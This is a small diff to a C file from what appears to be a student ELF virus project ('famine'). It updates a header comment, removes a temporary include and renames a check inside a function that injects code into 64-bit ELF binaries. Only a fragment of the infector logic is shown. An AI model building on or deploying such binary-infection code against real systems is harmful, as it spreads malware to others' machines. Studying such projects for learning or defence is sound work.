@@ -6,15 +6,13 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/12 13:57:42 by spolowy          ###   ########.fr       */
+/*   Updated: 2019/06/15 16:18:41 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 #include "infect.h"
 #include "errors.h"
-
-#include "syscall.h"//TMP
 
 static bool	change_entry(const struct safe_pointer info, const struct entry *original_entry)
 {
@@ -89,7 +87,7 @@ bool		elf64_packer(const struct famine food, size_t original_file_size)
 	size_t		shift_amount;
 
 	if (!find_entry(&original_entry, food.original_safe)
-	|| !check_if_infected(&original_entry, food.original_safe)
+	|| !can_infect(&original_entry, food.original_safe)
 	|| !define_shift_amount(&original_entry, &shift_amount)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
 	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
